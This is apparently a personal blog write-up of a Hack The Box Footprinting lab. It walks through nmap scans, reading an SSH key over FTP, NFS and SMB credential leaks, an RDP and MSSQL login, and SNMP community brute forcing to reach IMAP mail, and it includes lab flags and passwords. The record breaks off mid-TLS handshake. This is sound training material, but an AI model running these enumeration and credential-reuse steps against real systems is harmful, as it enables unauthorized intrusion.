---
title: FootPrinting Final Lab
published: 2026-03-21
description: 'HTB labs write up'
image: 'guide/fpbackground.jpg'
tags: [HTB,Footprinting,Port,nmap,learning]
category: 'learning'
draft: false 
lang: 'en'
---

Long time noo seee yaa ! just back with the module about `Footprinting` . Both you and me know this one really interesting skill everybody in this field should have. Especially, this module only contain fundamental and common services. I wrote this before go into the lab, so let’s see how i beat it !!!  

# **Easy**

**`Enumerate the server carefully and find the flag.txt file. Submit the contents of this file as the answer.`** 

### Perform `nmap` enumeration

As normally, i always want to perform something quick to have a wide range looking at the target 

> sudo nmap 10.129.27.221 -T 4
> 

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap 10.129.27.221 -T 4                               
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-20 01:43 -0400
Nmap scan report for 10.129.27.221 (10.129.27.221)
Host is up (1.8s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
53/tcp   open  domain
2121/tcp open  ccproxy-ftp

```

> sudo nmap -sC -sV -p 21,22,53,2121 10.129.27.221 -T4
> 

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -p 21,22,53,2121 10.129.27.221 -T4
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-20 01:54 -0400
Nmap scan report for 10.129.27.221 (10.129.27.221)
Host is up (0.48s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp?
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (ftp.int.inlanefreight.htb) [10.129.27.221]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
2121/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (Ceil's FTP) [10.129.27.221]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port21-TCP:V=7.98%I=7%D=3/20%Time=69BCE10C%P=x86_64-pc-linux-gnu%r(Gene
SF:ricLines,9C,"220\x20ProFTPD\x20Server\x20\(ftp\.int\.inlanefreight\.htb
SF:\)\x20\[10\.129\.27\.221\]\r\n500\x20Invalid\x20command:\x20try\x20bein
SF:g\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x20being\x20
SF:more\x20creative\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2121-TCP:V=7.98%I=7%D=3/20%Time=69BCE10C%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,8D,"220\x20ProFTPD\x20Server\x20\(Ceil's\x20FTP\)\x20\[10\.1
SF:29\.27\.221\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20
SF:creative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creat
SF:ive\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 293.01 seconds
                                                                
```

From the description of the lab i will focus on FTP service and there is also credentials for us `ceil`:`qwer1234`

#### With the FTP on port 22 there are nothing interesting in there ?

```bash
┌──(kali㉿kali)-[~]
└─$ ftp 10.129.27.221
Connected to 10.129.27.221.
220 ProFTPD Server (ftp.int.inlanefreight.htb) [10.129.27.221]
Name (10.129.27.221:kali): ceil
331 Password required for ceil
Password: 
230 User ceil logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||20084|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 root     root         4096 Nov 10  2021 .
drwxr-xr-x   2 root     root         4096 Nov 10  2021 ..
226 Transfer complete
ftp> exit
221 Goodbye.

```

#### With the FTP on port 2121 there are nothing interesting in there ?

```bash
ftp> ls -la
ftp: setsockopt SO_DEBUG (ignored): Permission denied
---> EPSV
229 Entering Extended Passive Mode (|||9928|)
229 Entering Extended Passive Mode (|||9928|)
---> LIST -la
150 Opening ASCII mode data connection for file list
resized buf to bufsize 131072 using rcvbuf_size 0
drwxr-xr-x   4 ceil     ceil         4096 Nov 10  2021 .
drwxr-xr-x   4 ceil     ceil         4096 Nov 10  2021 ..
-rw-------   1 ceil     ceil          294 Nov 10  2021 .bash_history
-rw-r--r--   1 ceil     ceil          220 Nov 10  2021 .bash_logout
-rw-r--r--   1 ceil     ceil         3771 Nov 10  2021 .bashrc
drwx------   2 ceil     ceil         4096 Nov 10  2021 .cache
-rw-r--r--   1 ceil     ceil          807 Nov 10  2021 .profile
drwx------   2 ceil     ceil         4096 Nov 10  2021 .ssh
-rw-------   1 ceil     ceil          759 Nov 10  2021 .viminfo

```

Nice. Here we have the infomation of ssh key pair

### FTP Information Leak for SSH Access

```bash
ftp> cd .ssh
---> CWD .ssh
250 CWD command successful
ftp> ls
ftp: setsockopt SO_DEBUG (ignored): Permission denied
---> EPSV
229 Entering Extended Passive Mode (|||29967|)
229 Entering Extended Passive Mode (|||29967|)
---> LIST
150 Opening ASCII mode data connection for file list
resized buf to bufsize 131072 using rcvbuf_size 0
-rw-rw-r--   1 ceil     ceil          738 Nov 10  2021 authorized_keys
-rw-------   1 ceil     ceil         3381 Nov 10  2021 id_rsa
-rw-r--r--   1 ceil     ceil          738 Nov 10  2021 id_rsa.pub

```

Then i download `id_rsa` and use it as a way to login SSH

> ssh -i id_rsa ceil@10.129.27.221
> 

```bash
┌──(kali㉿kali)-[~]
└─$ ssh -i id_rsa ceil@10.129.27.221
The authenticity of host '10.129.27.221 (10.129.27.221)' can't be established.
ED25519 key fingerprint is: SHA256:AtNYHXCA7dVpi58LB+uuPe9xvc2lJwA6y7q82kZoBNM
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:61: [hashed name]
    ~/.ssh/known_hosts:62: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.27.221' (ED25519) to the list of known hosts.
................................................................................
...................................snip..........................................
Last login: Wed Nov 10 05:48:02 2021 from 10.10.14.20
ceil@NIXEASY:~$ ls
ceil@NIXEASY:~$ ls -la
total 36
drwxr-xr-x 4 ceil ceil 4096 Nov 10  2021 .
drwxr-xr-x 5 root root 4096 Nov 10  2021 ..
-rw------- 1 ceil ceil  294 Nov 10  2021 .bash_history
-rw-r--r-- 1 ceil ceil  220 Nov 10  2021 .bash_logout
-rw-r--r-- 1 ceil ceil 3771 Nov 10  2021 .bashrc
drwx------ 2 ceil ceil 4096 Nov 10  2021 .cache
-rw-r--r-- 1 ceil ceil  807 Nov 10  2021 .profile
drwx------ 2 ceil ceil 4096 Nov 10  2021 .ssh
-rw------- 1 ceil ceil  759 Nov 10  2021 .viminfo
ceil@NIXEASY:~$ cd /
ceil@NIXEASY:/$ ls
bin   cdrom  etc   lib    lib64   lost+found  mnt  proc  run   snap  sys  usr
boot  dev    home  lib32  libx32  media       opt  root  sbin  srv   tmp  var
ceil@NIXEASY:/$ cd home/
ceil@NIXEASY:/home$ ls
ceil  cry0l1t3  flag
ceil@NIXEASY:/home$ cd flag
ceil@NIXEASY:/home/flag$ ls
flag.txt
ceil@NIXEASY:/home/flag$ cat flag.txt
HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}
```

Flag : `HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}`

Also some more interesting info in bash_history from ftp server

```bash
┌──(kali㉿kali)-[~]
└─$ cat .bash_history               
ls -al
mkdir ssh
cd ssh/
echo "test" > id_rsa
id
ssh-keygen -t rsa -b 4096
cd ..
rm -rf ssh/
ls -al
cd .ssh/
cat id_rsa
ls a-l
ls -al
cat id_rsa.pub >> authorized_keys
cd ..
cd /home
cd ceil/
ls -l
ls -al
mkdir flag
cd flag/
touch flag.txt
vim flag.txt 
cat flag.txt 
ls -al
mv flag/flag.txt .
                     
```

# Medium

### `NMAP`enumeration

As we can see there are lots of service !

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap 10.129.27.238 -T 4                        
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-20 02:44 -0400
Nmap scan report for 10.129.27.238 (10.129.27.238)
Host is up (0.61s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE
111/tcp  open  rpcbind
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 8.92 seconds

```

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap 10.129.27.238 -T 4 -p 111,135,139,445,2049,3389,5895 -sC -sV
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-20 02:45 -0400
Nmap scan report for 10.129.27.238 (10.129.27.238)
Host is up (0.54s latency).

PORT     STATE  SERVICE       VERSION
111/tcp  open   rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open   msrpc         Microsoft Windows RPC
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds?
2049/tcp open   nlockmgr      1-4 (RPC #100021)
3389/tcp open   ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-03-20T06:47:14+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=WINMEDIUM
| Not valid before: 2026-03-19T05:32:42
|_Not valid after:  2026-09-18T05:32:42
| rdp-ntlm-info: 
|   Target_Name: WINMEDIUM
|   NetBIOS_Domain_Name: WINMEDIUM
|   NetBIOS_Computer_Name: WINMEDIUM
|   DNS_Domain_Name: WINMEDIUM
|   DNS_Computer_Name: WINMEDIUM
|   Product_Version: 10.0.17763
|_  System_Time: 2026-03-20T06:47:05+00:00
5895/tcp closed unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-03-20T06:47:05
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 526.45 seconds

```

So here we have some services to focus on

| **Port** | **Service** |
| --- | --- |
| **445** | SMB |
| **2049** | NFS |
| **5985** | WinRM |
| **111** | RPCBind |

### Leak user credential through NFS `enum`

With such an NFS service, we can mount it on our local machine and create a new empty folder to which the NFS share will be mounted. Once mounted, we can navigate it and view the contents just like our local system.

```bash
┌──(kali㉿kali)-[~/…/HTB/footprinting/finallab/target-NFS]
└─$ showmount -e 10.129.27.238                                        

Export list for 10.129.27.238:
/TechSupport (everyone)

```

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/footprinting/finallab]
└─$ sudo mount -t nfs  10.129.27.238:/TechSupport ./target-NFS/ -o nolock

```

In this part, if you encounter some group and user access permission to the folder doesn't allow for anyone to access it. 

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/footprinting/finallab]
└─$ cd target-NFS                         
cd: permission denied: target-NFS
                                                                                                                    
                                                                                     
┌──(kali㉿kali)-[~/Downloads/HTB/footprinting/finallab]
└─$ ls -la
total 72
drwxrwxr-x 3 kali   kali     4096 Mar 20 03:07 .
drwxrwxr-x 4 kali   kali     4096 Mar 20 03:06 ..
drwx------ 2 nobody nogroup 65536 Nov 10  2021 target-NFS
```

To solve this problem, you just simply use `sudo` command with `ls` .

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/footprinting/finallab]
└─$ sudo ls -la target-NFS/
....................................snip...............................................
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283775.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283776.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283777.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283778.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283779.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283780.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283781.txt
-rwx------ 1 nobody nogroup  1305 Nov 10  2021 ticket4238791283782.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283783.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283784.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283785.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283786.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283787.txt
....................................snip...............................................
....................................snip...............................................
```

Now we've got an interesting file that contains 1305 bytes of data.

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/footprinting/finallab]
└─$ sudo cat target-NFS/ticket4238791283782.txt
Conversation with InlaneFreight Ltd

Started on November 10, 2021 at 01:27 PM London time GMT (GMT+0200)
---
01:27 PM | Operator: Hello,. 
 
So what brings you here today?
01:27 PM | alex: hello
01:27 PM | Operator: Hey alex!
01:27 PM | Operator: What do you need help with?
01:36 PM | alex: I run into an issue with the web config file on the system for the smtp server. do you mind to take a look at the config?
01:38 PM | Operator: Of course
01:42 PM | alex: here it is:

 1smtp {
 2    host=smtp.web.dev.inlanefreight.htb
 3    #port=25
 4    ssl=true
 5    user="alex"
 6    password="lol123!mD"
 7    from="alex.g@web.dev.inlanefreight.htb"
 8}
 9
10securesocial {
11    
12    onLoginGoTo=/
13    onLogoutGoTo=/login
14    ssl=false
15    
16    userpass {      
17      withUserNameSupport=false
18      sendWelcomeEmail=true
19      enableGravatarSupport=true
20      signupSkipLogin=true
21      tokenDuration=60
22      tokenDeleteInterval=5
23      minimumPasswordLength=8
24      enableTokenJob=true
25      hasher=bcrypt
26      }
27
28     cookie {
29     #       name=id
30     #       path=/login
31     #       domain="10.129.2.59:9500"
32            httpOnly=true
33            makeTransient=false
34            absoluteTimeoutInMinutes=1440
35            idleTimeoutInMinutes=1440
36    }   

---

```

With the credential `alex` - `lol123!mD`  leak in the file now we can explore further to see if it also help us login to any other services?

### SMB enum

The credential above help us access to network files share on `smb` service !

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/footprinting/finallab]
└─$ smbclient -L //10.129.27.238/ -U alex%'lol123!mD'

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        devshare        Disk      
        IPC$            IPC       Remote IPC
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.27.238 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

From the result, we see the `devshare` look really interesting !

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/footprinting/finallab]
└─$ smbclient //10.129.28.12/devshare -U alex%'lol123!mD'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Nov 10 11:12:22 2021
  ..                                  D        0  Wed Nov 10 11:12:22 2021
  important.txt                       A       16  Wed Nov 10 11:12:55 2021
get 
                6367231 blocks of size 4096. 2589720 blocks available
smb: \> get important.txt
getting file \important.txt of size 16 as important.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> !cat important.txt
sa:87N1ns@slls83
smb: \> 

```

Once again we got a new credential `sa`:`87N1ns@slls83` 

Notice that "sa" credential stands for "system administrator" which is a really famous default credential on MSSQL.

Ok but we dont have that service open on nmap scan? 

But there is RDP service allow us to remotely access to server computer !

 

### Remote Window Access

```bash
└─$ xfreerdp /v:10.129.28.12 /u:alex /p:'lol123!mD' /dynamic-resolution
```

In desktop, there is MSSQL application .

![image.png](guide/fp1.png)

Run app as administrator and using this `sa`:`87N1ns@slls83` From SMB enum to login. But it seems like our sa account doesn’t available on server.

![image.png](guide/fp2.png)

It would work in someway so after a while i open the application with administrator and using `Windows Authentication`

![image.png](guide/fp3.png)

Then i completely login to the SQL any extract information in the database and look for `HTB` user !

![image.png](guide/fp4.png)

Password : lnch7ehrdn43i7AoqVPK4zWR

Done !

# Hard

### Nmap enumeration

#### TCP Port Scan

First, I initiate Nmap scan that revealed several standard mail-related ports and SSH.

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap 10.129.29.119 -T 4                                          
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-21 01:31 -0400
Nmap scan report for 10.129.29.119 (10.129.29.119)
Host is up (1.7s latency).
Not shown: 995 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
110/tcp open  pop3
143/tcp open  imap
993/tcp open  imaps
995/tcp open  pop3s

Nmap done: 1 IP address (1 host up) scanned in 7.18 seconds
                                                                      
```

We know that all service we can with TCP syn is all needed credentials to login. But we dont have any so i decide to perform UDP nmap scan too 

#### UDP

```bash
──(kali㉿kali)-[~/…/Wordlist/SecLists/Passwords/Leaked-Databases]
└─$ sudo nmap -T 5 -sU 10.129.29.119                                      
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-21 02:13 -0400
Nmap scan report for 10.129.29.119 (10.129.29.119)
Host is up (0.39s latency).
Not shown: 715 closed udp ports (port-unreach), 284 open|filtered udp ports (no-response)
PORT    STATE SERVICE
161/udp open  snmp

Nmap done: 1 IP address (1 host up) scanned in 779.19 seconds

```

```bash
┌──(kali㉿kali)-[~/…/Wordlist/SecLists/Passwords/Leaked-Databases]
└─$ sudo nmap  -sU 10.129.29.119 -p 161 -sC -sV 
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-21 03:10 -0400
Nmap scan report for 10.129.29.119 (10.129.29.119)
Host is up (0.39s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    net-snmp; net-snmp SNMPv3 server
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 5b99e75a10288b6100000000
|   snmpEngineBoots: 11
|_  snmpEngineTime: 2h14m41s

```

With the  SNMP was found **open**.

We go to the next phase….

### SNMP Exploitation

#### scanning community

```bash
┌──(kali㉿kali)-[~/…/Wordlist/SecLists/Discovery/SNMP]
└─$ onesixtyone -c snmp.txt  10.129.29.119 
Scanning 1 hosts, 3219 communities
10.129.29.119 [backup] Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64
```

Using `onesixtyone` with a community string wordlist, the community string **"backup"** was identified.

```bash
┌──(kali㉿kali)-[~/…/Wordlist/SecLists/Discovery/SNMP]
└─$ snmpwalk -v2c -c backup 10.129.29.119
iso.3.6.1.2.1.1.1.0 = STRING: "Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (948149) 2:38:01.49
iso.3.6.1.2.1.1.4.0 = STRING: "Admin <tech@inlanefreight.htb>"
iso.3.6.1.2.1.1.5.0 = STRING: "NIXHARD"
iso.3.6.1.2.1.1.6.0 = STRING: "Inlanefreight"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (8) 0:00:00.08
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (7) 0:00:00.07
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (7) 0:00:00.07
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (7) 0:00:00.07
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (7) 0:00:00.07
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (7) 0:00:00.07
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (7) 0:00:00.07
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (7) 0:00:00.07
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (7) 0:00:00.07
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (8) 0:00:00.08
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (8) 0:00:00.08
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (950102) 2:38:21.02
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 EA 03 15 07 21 37 00 2B 00 00 
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.4.0-90-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro ipv6.disable=1 maybe-ubiquity
"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 142
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
iso.3.6.1.2.1.25.1.7.1.1.0 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.2.6.66.65.67.75.85.80 = STRING: "/opt/tom-recovery.sh"
iso.3.6.1.2.1.25.1.7.1.2.1.3.6.66.65.67.75.85.80 = STRING: "tom NMds732Js2761"
iso.3.6.1.2.1.25.1.7.1.2.1.4.6.66.65.67.75.85.80 = ""
iso.3.6.1.2.1.25.1.7.1.2.1.5.6.66.65.67.75.85.80 = INTEGER: 5
iso.3.6.1.2.1.25.1.7.1.2.1.6.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.7.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.20.6.66.65.67.75.85.80 = INTEGER: 4
iso.3.6.1.2.1.25.1.7.1.2.1.21.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.3.1.1.6.66.65.67.75.85.80 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:"
iso.3.6.1.2.1.25.1.7.1.3.1.2.6.66.65.67.75.85.80 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:
Authentication token manipulation error
chpasswd: (line 1, user tom) password not changed
Changing password for tom."
iso.3.6.1.2.1.25.1.7.1.3.1.3.6.66.65.67.75.85.80 = INTEGER: 4
iso.3.6.1.2.1.25.1.7.1.3.1.4.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.1 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:"
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.2 = STRING: "Authentication token manipulation error"
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.3 = STRING: "chpasswd: (line 1, user tom) password not changed"
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.4 = STRING: "Changing password for tom."
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.4 = No more variables left in this MIB View (It is past the end of the MIB tree)

```

With the "backup" community string, i perform a full `snmpwalk`. Deep within the MIB tree, cleartext credentials for a recovery script were discovered:

- **Credential:** `tom : NMds732Js2761`

Then i quickly check if the credential valid with imaps/pop3 services ?

```bash
┌──(kali㉿kali)-[~/…/Wordlist/SecLists/Discovery/SNMP]
└─$ curl -k 'imaps://10.129.29.119' --user tom:NMds732Js2761    
* LIST (\HasNoChildren) "." Notes
* LIST (\HasNoChildren) "." Meetings
* LIST (\HasNoChildren \UnMarked) "." Important
* LIST (\HasNoChildren) "." INBOX

```

Nice

### Email Enumeration (IMAP)

- **Authentication:** `1 LOGIN tom NMds732Js2761`
- **Folder Selection:** `A01 SELECT INBOX`
- **Message Discovery:** A message with the subject **"KEY"** was found.

```bash
┌──(kali㉿kali)-[~/…/Wordlist/SecLists/Discovery/SNMP]
└─$ openssl s_client -connect 10.129.29.150:imaps
Connecting to 10.129.29.150
CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 CN=NIXHARD
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN=NIXHARD
verify return:1
---
Certificate chain
 0 s:CN=NIXHARD
   i:CN=NIXHARD
   a:PKEY: RSA, 2048 (bit); sigalg: sha256WithRSAEncryption
   v:NotBefore: Nov 10 01:30:25 2021 GMT; NotAfter: Nov  8 01:30:25 2031 GMT
---
Server certificate
-----BEGIN CERTIFICATE-----
MIIC0zCCAbugAwIBAgIUC6tYfrtqQqCrhjYv11bUtaKet3EwDQYJKoZIhvcNAQEL
BQAwEjEQMA4GA1UEAwwHTklYSEFSRDAeFw0yMTExMTAwMTMwMjVaFw0zMTExMDgw
MTMwMjVaMBIxEDAOBgNVBAMMB05JWEhBUkQwggEiMA0GCSqGSIb3DQEBAQUAA4IB
DwAwggEKAoIBAQDEBpDfkH4Ro5ZXW44NvnF3N9lKz27V1hgRppyUk5y/SEPKt2zj
EU+r2tEHUeHoJHQZBbW0ybxh+X2H3ZPNEG9nV1GtFQfTBVcrUEpN5VV15aIbdh+q
j53pp/wcL/d8+Zg2ZAaVYWvQHVqtsAudQmynrV1MHA39A44fG3/SutKlurY8AKR0
MW5zMPtflMc/N3+lH8UUMBf2Q+zNSyZLiBEihxK3kfMW92HqWeh016egSIFuxUsH
kk4xpGmyG9NDYna47dQzoHCg+42KgqFvWrGw2nIccaEIX5XA8rU9u53C7EQzDzmQ
vAtHpKWBwNmiivxAz/QC7MPExWIWtZtOqxmfAgMBAAGjITAfMAkGA1UdEwQCMAAw
EgYDVR0RBAswCYIHTklYSEFSRDANBgkqhkiG9w0BAQsFAAOCAQEAG+Dm9pLJgNGC
X1YmznmtBUekhXMrU67tQl745fFasJQzIrDgVtK27fjAtQRwvIbDruSwTj47E7+O
XdS7qyjFNBerklWNq4fEAVI7BmkxnTS9542okA/+UmeG70LdKjzFS+LjjOnyWzTh
YwU8uUjLfnRca74kY0DkVHOIkwZQha0J+BrKSADq/zDjkG0g4v0vzHINOmHx9eiE
67NoJKJPY5S3RYWxl/4x8Kphx7PNJBPC75gYjlxxDhxdYu9a3daqJUa58/qOm6P8
w1P9nA6lkg7NopyqepulLAzIcqnTjb/nMD2Pd9b6vgWc3IqSfFreqjzshZ+FjNZo
zR+tR6z4TQ==
-----END CERTIFICATE-----
subject=CN=NIXHARD
issuer=CN=NIXHARD
---
No client certificate CA names sent
Peer signing digest: SHA256
Peer signature type: rsa_pss_rsae_sha256
